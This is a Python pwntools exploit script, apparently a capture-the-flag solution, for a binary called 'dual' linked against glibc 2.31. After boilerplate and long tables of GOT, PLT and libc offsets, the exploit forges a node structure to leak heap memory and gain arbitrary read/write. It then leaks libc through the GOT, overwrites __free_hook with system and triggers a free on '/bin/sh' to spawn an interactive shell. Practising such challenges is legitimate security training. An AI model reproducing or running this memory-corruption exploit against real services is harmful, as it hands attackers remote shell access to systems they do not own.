#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4242) # not 4000 to force use of QIRA arg


library_path = '/root/apps/libc-database/db/libc6_2.31-0ubuntu9_amd64/lib/x86_64-linux-gnu'
libc_path = '/root/apps/libc-database/db/libc6_2.31-0ubuntu9_amd64/lib/x86_64-linux-gnu/libc-2.31.so'
ld_path = '/root/apps/libc-database/db/libc6_2.31-0ubuntu9_amd64/lib/x86_64-linux-gnu/ld-2.31.so'
custom_libc = os.path.exists(libc_path)
# libc = ELF(libc_path)
qira_spawn = '''
LIBC_FATAL_STDERR_=1 QEMU_LD_PREFIX='/root/apps/libc-database/db/libc6_2.31-0ubuntu9_amd64' qira -s ./dual
'''

exe_path = 'dual'
exe_path = os.path.abspath(exe_path)
# exe = ELF(exe_path)

context.arch = 'amd64'
# context.log_level = 'error'


if args.QIRA:
  print(qira_spawn)
  host = "127.0.0.1"
  port = 4000

def local(argv=[], *a, **kw):
  if args.GDB:
    # todo add custom libc here
    # todo add iterm spawn here
    return gdb.debug([exe_path] + argv, gdbscript=gdbscript, *a, **kw)
  else:
    # todo add args.QEMU
    env = {
        'LIBC_FATAL_STDERR_': '1',
    }
    # TODO add an option to use LD_LIBRARY_PATH + patched elf(/lib64/ld-my___-x86-64.so__) + auto switching symlink from a patched interpreter
    if custom_libc and not args.SYSTEM_LIBC:
      proc_cmd = [ld_path, '--library-path', library_path, exe_path]
    else:
      proc_cmd = [exe_path]
    print(' '.join(proc_cmd))
    return process(proc_cmd + argv, *a, env=env, **kw)


def remote(argv=[], *a, **kw):
  io = connect(host, port)
  if args.GDB:
    gdb.attach(io, gdbscript=gdbscript)
  return io

def start(argv=[], *a, **kw):
  if args.LOCAL and not args.QIRA:
    return local(argv, *a, **kw)
  else:
    return remote(argv, *a, **kw)

lu64 = lambda x: u64(x.ljust(8, b'\x00'))
lu32 = lambda x: u32(x.ljust(4, b'\x00'))


gdbscript = '''
continue
'''

'''
0xe6ce3 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6ce6 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6ce9 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL


'''

one_gadget = [ 0xe6ce3, 0xe6ce6, 0xe6ce9 ]

# elf gadgets
# ROP fucked up

o_exe_got_posix_spawnattr_destroy          =  0x518140
o_exe_got__Unwind_Backtrace                =  0x518148
o_exe_got_pthread_cond_signal              =  0x518150
o_exe_got__Unwind_GetIPInfo                =  0x518158
o_exe_got___errno_location                 =  0x518178
o_exe_got_symlink                          =  0x518188
o_exe_got_sendto                           =  0x518198
o_exe_got_syscall                          =  0x5181b0
o_exe_got_pthread_condattr_init            =  0x5181e8
o_exe_got_posix_spawnattr_setsigmask       =  0x518200
o_exe_got_bind                             =  0x518208
o_exe_got_socket                           =  0x518288
o_exe_got_pthread_mutex_trylock            =  0x5182b0
o_exe_got_fork                             =  0x5182b8
o_exe_got_dl_iterate_phdr                  =  0x5182c0
o_exe_got_link                             =  0x5182d8
o_exe_got_nanosleep                        =  0x518300
o_exe_got__Unwind_RaiseException           =  0x518328
o_exe_got_recv                             =  0x518330
o_exe_got_realpath                         =  0x518348
o_exe_got_pthread_cond_broadcast           =  0x518350
o_exe_got_write                            =  0x518360
o_exe_got_readdir64_r                      =  0x518368
o_exe_got_readv                            =  0x5183a0
o_exe_got_rmdir                            =  0x5183c0
o_exe_got_strlen                           =  0x5183d0
o_exe_got_pthread_mutexattr_destroy        =  0x5183d8
o_exe_got_memcmp                           =  0x5183e0
o_exe_got_mkdir                            =  0x5183f0
o_exe_got_ftruncate64                      =  0x5183f8
o_exe_got_fchmod                           =  0x518408
o_exe_got_unlink                           =  0x518410
o_exe_got___xpg_strerror_r                 =  0x518428
o_exe_got_accept4                          =  0x518458
o_exe_got_fdatasync                        =  0x518468
o_exe_got_pthread_join                     =  0x518478
o_exe_got_getuid                           =  0x518488
o_exe_got_send                             =  0x518490
o_exe_got_posix_memalign                   =  0x5184a8
o_exe_got_getcwd                           =  0x5184b8
o_exe_got_pthread_condattr_destroy         =  0x5184d0
o_exe_got_writev                           =  0x5184d8
o_exe_got_dirfd                            =  0x5184f0
o_exe_got_pthread_attr_getguardsize        =  0x5184f8
o_exe_got_memset                           =  0x518500
o_exe_got_abort                            =  0x518508
o_exe_got_munmap                           =  0x518510
o_exe_got_pthread_create                   =  0x518530
o_exe_got_fcntl                            =  0x518538
o_exe_got_pthread_key_create               =  0x518578
o_exe_got___cxa_thread_atexit_impl         =  0x518580
o_exe_got__Unwind_SetGR                    =  0x518588
o_exe_got_rename                           =  0x518598
o_exe_got_pipe2                            =  0x5185d0
o_exe_got_sysconf                          =  0x5185d8
o_exe_got_pthread_attr_setstacksize        =  0x5185e0
o_exe_got_calloc                           =  0x5185e8
o_exe_got_getpeername                      =  0x518650
o_exe_got_open                             =  0x518658
o_exe_got_pthread_attr_getstack            =  0x518660
o_exe_got_getsockopt                       =  0x518678
o_exe_got_pthread_mutex_unlock             =  0x518680
o_exe_got_recvfrom                         =  0x518688
o_exe_got_execvp                           =  0x5186b0
o_exe_got_pthread_rwlock_wrlock            =  0x5186b8
o_exe_got_waitpid                          =  0x5186e8
o_exe_got__Unwind_GetDataRelBase           =  0x518708
o_exe_got_memcpy                           =  0x518710
o_exe_got_connect                          =  0x518728
o_exe_got_posix_spawnattr_setsigdefault    =  0x518740
o_exe_got_lseek64                          =  0x518748
o_exe_got_fsync                            =  0x518758
o_exe_got_socketpair                       =  0x518768
o_exe_got_pthread_self                     =  0x518770
o_exe_got_posix_spawn_file_actions_adddup2 =  0x518790
o_exe_got_clock_gettime                    =  0x518798
o_exe_got_chmod                            =  0x5187a8
o_exe_got_getsockname                      =  0x5187b0
o_exe_got_dup2                             =  0x5187b8
o_exe_got_pthread_condattr_setclock        =  0x5187e0
o_exe_got_bcmp                             =  0x518830
o_exe_got_pthread_detach                   =  0x518848
o_exe_got_pthread_sigmask                  =  0x518868
o_exe_got_readlink                         =  0x518888
o_exe_got_memchr                           =  0x518900
o_exe_got_listen                           =  0x518918
o_exe_got__Unwind_FindEnclosingFunction    =  0x518930
o_exe_got_pthread_mutex_destroy            =  0x518940
o_exe_got_signal                           =  0x518950
o_exe_got_free                             =  0x518958
o_exe_got_pthread_cond_init                =  0x518978
o_exe_got_exit                             =  0x518980
o_exe_got__Unwind_GetIP                    =  0x518988
o_exe_got_pthread_attr_init                =  0x518990
o_exe_got_getenv                           =  0x518998
o_exe_got_posix_spawn_file_actions_init    =  0x5189b8
o_exe_got_sigemptyset                      =  0x5189c8
o_exe_got_sigaction                        =  0x5189d0
o_exe_got_getaddrinfo                      =  0x5189f0
o_exe_got_prctl                            =  0x518a18
o_exe_got_freeaddrinfo                     =  0x518a20
o_exe_got_pthread_getattr_np               =  0x518a38
o_exe_got_pthread_rwlock_rdlock            =  0x518a50
o_exe_got_malloc                           =  0x518a60
o_exe_got_pthread_key_delete               =  0x518a88
o_exe_got_shutdown                         =  0x518ab0
o_exe_got_unsetenv                         =  0x518ac0
o_exe_got_pthread_mutexattr_init           =  0x518ad8
o_exe_got_gai_strerror                     =  0x518ae8
o_exe_got_posix_spawn_file_actions_destroy =  0x518b08
o_exe_got_pthread_getspecific              =  0x518b18
o_exe_got_getppid                          =  0x518b28
o_exe_got_ioctl                            =  0x518b38
o_exe_got_posix_spawnattr_setflags         =  0x518b40
o_exe_got_kill                             =  0x518b48
o_exe_got_read                             =  0x518b90
o_exe_got_sched_yield                      =  0x518ba0
o_exe_got_getpid                           =  0x518ba8
o_exe_got_pthread_mutex_lock               =  0x518bb0
o_exe_got_chdir                            =  0x518bb8
o_exe_got__Unwind_GetLanguageSpecificData  =  0x518bc8
o_exe_got_pthread_mutex_init               =  0x518be8
o_exe_got_opendir                          =  0x518bf8
o_exe_got_setenv                           =  0x518c08
o_exe_got_poll                             =  0x518c10
o_exe_got_pthread_cond_timedwait           =  0x518c30
o_exe_got_pthread_cond_wait                =  0x518c48
o_exe_got__Unwind_GetTextRelBase           =  0x518c58
o_exe_got_sigaddset                        =  0x518c60
o_exe_got__Unwind_DeleteException          =  0x518cd8
o_exe_got_mprotect                         =  0x518cf8
o_exe_got_closedir                         =  0x518d20
o_exe_got_setgroups                        =  0x518d38
o_exe_got_memrchr                          =  0x518d40
o_exe_got_memmove                          =  0x518d48
o_exe_got__exit                            =  0x518d50
o_exe_got_pthread_rwlock_unlock            =  0x518d60
o_exe_got_realloc                          =  0x518d68
o_exe_got_pread64                          =  0x518d70
o_exe_got_posix_spawnattr_init             =  0x518d80
o_exe_got_pthread_attr_destroy             =  0x518d88
o_exe_got__Unwind_GetRegionStart           =  0x518d90
o_exe_got___res_init                       =  0x518d98
o_exe_got_environ                          =  0x518db0
o_exe_got_open64                           =  0x518df8
o_exe_got_mmap                             =  0x518e58
o_exe_got_setgid                           =  0x518e60
o_exe_got_setsockopt                       =  0x518e68
o_exe_got_pwrite64                         =  0x518e70
o_exe_got__Unwind_SetIP                    =  0x518e98
o_exe_got_pthread_mutexattr_settype        =  0x518eb8
o_exe_got_posix_spawnp                     =  0x518ec8
o_exe_got_pthread_setspecific              =  0x518ed8
o_exe_got__Unwind_GetCFA                   =  0x518f08
o_exe_got_dlsym                            =  0x518f10
o_exe_got_sigaltstack                      =  0x518f38
o_exe_got___libc_start_main                =  0x518f40
o_exe_got___gmon_start__                   =  0x518f68
o_exe_got_setuid                           =  0x518f70
o_exe_got_pthread_cond_destroy             =  0x518fa8
o_exe_got_close                            =  0x518fc0
o_exe_got_getpwuid_r                       =  0x518ff8
o_exe_got_stdout                           =  0x519140
o_exe_got_stdin                            =  0x519150
o_exe_got_stderr                           =  0x519160
o_exe_got__Znam                            =  0x519018
o_exe_got_setvbuf                          =  0x519020
o_exe_got_printf                           =  0x519028
o_exe_got_strtoul                          =  0x519030
o_exe_got__ZSt20__throw_length_errorPKc    =  0x519038
o_exe_got___cxa_atexit                     =  0x519040
o_exe_got__ZdlPv                           =  0x519048
o_exe_got__Znwm                            =  0x519050
o_exe_got___lxstat64                       =  0x519058
o_exe_got___fxstat64                       =  0x519060
o_exe_got_strtol                           =  0x519068
o_exe_got___xstat64                        =  0x519070
o_exe_got___fxstatat64                     =  0x519078
o_exe_got_puts                             =  0x519080
o_exe_got___tls_get_addr                   =  0x519088
o_exe_got__Unwind_Resume                   =  0x519090
o_exe_got_fwrite                           =  0x519098


o_exe_plt__Znam                         =  0x404030
o_exe_plt_setvbuf                       =  0x404040
o_exe_plt_printf                        =  0x404050
o_exe_plt_strtoul                       =  0x404060
o_exe_plt__ZSt20__throw_length_errorPKc =  0x404070
o_exe_plt___cxa_atexit                  =  0x404080
o_exe_plt__ZdlPv                        =  0x404090
o_exe_plt__Znwm                         =  0x4040a0
o_exe_plt___lxstat64                    =  0x4040b0
o_exe_plt___fxstat64                    =  0x4040c0
o_exe_plt_strtol                        =  0x4040d0
o_exe_plt___xstat64                     =  0x4040e0
o_exe_plt___fxstatat64                  =  0x4040f0
o_exe_plt_puts                          =  0x404100
o_exe_plt___tls_get_addr                =  0x404110
o_exe_plt__Unwind_Resume                =  0x404120
o_exe_plt_fwrite                        =  0x404130
o_exe_plt_abort                         =  0x404140
o_exe_plt_free                          =  0x404148
o_exe_plt_read                          =  0x404150
o_exe_plt_memmove                       =  0x404158
o_exe_main                              =  0x405020


o_libc___libc_start_main                =   0x26fc0
o_libc_system                           =   0x55410
o_libc_malloc                           =   0x9d260
o_libc_free                             =   0x9d850
o_libc___malloc_hook                    =  0x1ebb70
o_libc___free_hook                      =  0x1eeb28
o_libc___realloc_hook                   =  0x1ebb68
o_libc_open64                           =  0x110cc0
o_libc_read                             =  0x110fa0
o_libc_write                            =  0x111040
o_libc_posix_spawnattr_destroy          =  0x10f680
o_libc_pthread_cond_signal              =  0x1639e0
o_libc___errno_location                 =   0x27430
o_libc_symlink                          =  0x112be0
o_libc_sendto                           =  0x123640
o_libc_syscall                          =  0x11b6f0
o_libc_pthread_condattr_init            =   0x97410
o_libc_posix_spawnattr_setsigmask       =  0x110060
o_libc_bind                             =  0x123130
o_libc_socket                           =  0x123770
o_libc_fork                             =   0xe5ee0
o_libc_dl_iterate_phdr                  =  0x162060
o_libc_link                             =  0x112b80
o_libc_nanosleep                        =   0xe5ea0
o_libc_recv                             =  0x1232c0
o_libc_realpath                         =   0x55440
o_libc_pthread_cond_broadcast           =   0x97440
o_libc_readdir64_r                      =   0xe1400
o_libc_readv                            =  0x1173a0
o_libc_rmdir                            =  0x112d00
o_libc_strlen                           =   0xa27b0
o_libc_bcmp                             =   0xa3590
o_libc_mkdir                            =  0x110c30
o_libc_ftruncate64                      =  0x119cc0
o_libc_fchmod                           =  0x110b70
o_libc_unlink                           =  0x112ca0
o_libc___xpg_strerror_r                 =   0xabd60
o_libc_accept4                          =  0x123aa0
o_libc_fdatasync                        =  0x118220
o_libc_getuid                           =   0xe70d0
o_libc_send                             =  0x1234e0
o_libc_posix_memalign                   =   0x9f9b0
o_libc_getcwd                           =  0x111a50
o_libc_pthread_condattr_destroy         =   0x973e0
o_libc_writev                           =  0x117440
o_libc_dirfd                            =   0xe12d0
o_libc_memset                           =   0xa36c0
o_libc_abort                            =   0x2572e
o_libc_munmap                           =  0x11b940
o_libc_fcntl                            =  0x111450
o_libc___cxa_thread_atexit_impl         =   0x4a330
o_libc_rename                           =   0x66000
o_libc_pipe2                            =  0x111930
o_libc_sysconf                          =   0xe8370
o_libc_calloc                           =   0x9ec90
o_libc_getpeername                      =  0x123200
o_libc_getsockopt                       =  0x123260
o_libc_pthread_mutex_unlock             =   0x97690
o_libc_recvfrom                         =  0x123380
o_libc_execvp                           =   0xe66a0
o_libc_waitpid                          =   0xe5be0
o_libc_memcpy                           =   0xbec40
o_libc_connect                          =  0x123160
o_libc_posix_spawnattr_setsigdefault    =  0x10f6e0
o_libc_lseek64                          =  0x1110e0
o_libc_fsync                            =  0x118160
o_libc_socketpair                       =  0x1237a0
o_libc_pthread_self                     =   0x97dc0
o_libc_posix_spawn_file_actions_adddup2 =  0x10f490
o_libc_clock_gettime                    =   0xe0210
o_libc_chmod                            =  0x110b40
o_libc_getsockname                      =  0x123230
o_libc_dup2                             =  0x1118a0
o_libc_readlink                         =  0x112c40
o_libc_memchr                           =   0xa3550
o_libc_listen                           =  0x123290
o_libc_pthread_mutex_destroy            =   0x97600
o_libc_signal                           =   0x46080
o_libc_pthread_cond_init                =   0x974a0
o_libc_exit                             =   0x49bc0
o_libc_pthread_attr_init                =   0x97e60
o_libc_getenv                           =   0x49020
o_libc_posix_spawn_file_actions_init    =  0x10f2d0
o_libc_sigemptyset                      =   0x46c40
o_libc_sigaction                        =   0x46400
o_libc_getaddrinfo                      =  0x108e20
o_libc_prctl                            =  0x122d00
o_libc_freeaddrinfo                     =  0x109af0
o_libc_shutdown                         =  0x123740
o_libc_unsetenv                         =   0x496d0
o_libc_gai_strerror                     =  0x109b40
o_libc_posix_spawn_file_actions_destroy =  0x10f2f0
o_libc_getppid                          =   0xe70c0
o_libc_ioctl                            =  0x117370
o_libc_posix_spawnattr_setflags         =  0x10f740
o_libc_kill                             =   0x46550
o_libc_sched_yield                      =  0x105700
o_libc_getpid                           =   0xe70b0
o_libc_pthread_mutex_lock               =   0x97660
o_libc_chdir                            =  0x1119f0
o_libc_pthread_mutex_init               =   0x97630
o_libc_opendir                          =   0xe0e70
o_libc_setenv                           =   0x49670
o_libc_poll                             =  0x115920
o_libc_pthread_cond_timedwait           =  0x163a40
o_libc_pthread_cond_wait                =   0x97500
o_libc_sigaddset                        =   0x46cf0
o_libc_mprotect                         =  0x11b970
o_libc_closedir                         =   0xe1100
o_libc_setgroups                        =   0xe23c0
o_libc_memrchr                          =   0xabd20
o_libc_memmove                          =   0xa3600
o_libc__exit                            =   0xe6100
o_libc_realloc                          =   0x9e000
o_libc_pread64                          =  0x10f130
o_libc_posix_spawnattr_init             =  0x10f640
o_libc_pthread_attr_destroy             =   0x97e40
o_libc___res_init                       =  0x143f50
o_libc_environ                          =  0x1ef2e0
o_libc_mmap                             =  0x11b890
o_libc_setgid                           =   0xe71e0
o_libc_setsockopt                       =  0x123710
o_libc_pwrite64                         =  0x10f1e0
o_libc_posix_spawnp                     =  0x165af0
o_libc_sigaltstack                      =   0x46b40
o_libc_setuid                           =   0xe7140
o_libc_pthread_cond_destroy             =   0x97470
o_libc_close                            =  0x1117e0
o_libc_getpwuid_r                       =   0xe51a0
o_libc_stdout                           =  0x1ec788
o_libc_stdin                            =  0x1ec790
o_libc_stderr                           =  0x1ec780
o_libc_setvbuf                          =   0x87e60
o_libc_printf                           =   0x64e10
o_libc_strtoul                          =   0x4bc60
o_libc___cxa_atexit                     =   0x49f60
o_libc___lxstat64                       =  0x110540
o_libc___fxstat64                       =  0x1104e0
o_libc_strtol                           =   0x4bc20
o_libc___xstat64                        =  0x110480
o_libc___fxstatat64                     =  0x110980
o_libc_puts                             =   0x875a0
o_libc___tls_get_addr                   =  0x1eb058
o_libc_fwrite                           =   0x86480
o_libc_binsh                            =  0x1b75aa



'''
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

some strings from binary:

'''

#############################################
import base64
OP_CREATE     = 1
OP_CONNECT    = 2
OP_DISCONNECT = 3
OP_WRITE_TEXT = 4
OP_WRITE_BIN  = 5
OP_READ_TEXT  = 6
OP_GC_RU      = 7



io = start()

op = lambda x: (io.recvuntil('op>\n'), io.sendline(str(x)))
idx = lambda x: (io.recvuntil('id>\n'), io.sendline(str(x)))

class Node:
  def __init__(self):
    self.children_ids = []

mirror = { 0: Node() }

def create(pred_idx):
  assert pred_idx in mirror
  op(OP_CREATE)
  idx(pred_idx)
  newid = int(io.recvline().strip())
  mirror[pred_idx].children_ids.append(newid)
  mirror[newid] = Node()
  return newid

def connect(pred_idx, succ_id):
  op(OP_CONNECT)
  idx(pred_idx)
  idx(pred_idx)

def write_bin(node_id, data):
  op(OP_WRITE_BIN)
  idx(node_id)
  io.recvuntil('bin_len>\n')
  io.sendline(str(len(data)))
  io.send(data)

def write_text(node_id, data):
  op(OP_WRITE_TEXT)
  idx(node_id)
  io.recvuntil('text_len>\n')
  io.sendline(str(len(data)))
  io.send(data)

def read_text(node_id):
  op(OP_READ_TEXT)
  idx(node_id)

def disconnect(node_id, node_id2):
  op(OP_DISCONNECT)
  idx(node_id)
  idx(node_id2)

def gc():
  op(OP_GC_RU)

# a = create(0)
write_bin(0, b'')
n1 = create(0)
n2 = create(0)
write_text(n2, p64(0xcafebabe))
# n3 = create(0)


node1_data = b''
node1_data += p64(1)
node1_data += p64(0xdead) # hz
node1_data += p64(0)      # children.begin
node1_data += p64(0)      # children.end
node1_data += p64(0)      # children.cap
node1_data += p64(0x1000)  # text_len
node1_data += p64(2)      # text_obj_id
node1_data += p64(0)      # hz2
assert len(node1_data) == 0x40
write_text(0, node1_data)

# disconnect(0, n3)

# gc()

read_text(1)
leak = io.recvn(0x1000)
print(hexdump(leak))
current_n2 = None
def repoint_n2(newptr):
  global current_n2
  # if current_n2 != newptr:
  if True:
    new_heap = bytearray(leak)
    new_heap[0x68:0x70] = p64(newptr)
    write_text(1, bytes(new_heap))
  else:
    print(f'repoint_n2 already at {hex(newptr)}')

def read_at(where):
  repoint_n2(where)
  read_text(n2)
  it_read = io.recvn(8)
  print(f'reading {hex(where)} => {bytes.hex(it_read)}')
  return it_read

def write_at(where, what):
  print(f'writing {hex(where)} => {bytes.hex(what)}')
  assert len(what) == 8
  repoint_n2(where)
  write_text(n2, what)


free = lu64(read_at(o_exe_got_free))
libc = free - o_libc_free
print(f'libc {hex(libc)}')

write_at(libc + o_libc___free_hook, p64(libc + o_libc_system))


write_at(0x519190, b'/bin/sh\x00')
write_text(n2, b'a' * 9) # write a string longer than 8, so the prev is freed/system'ed 


io.interactive()
















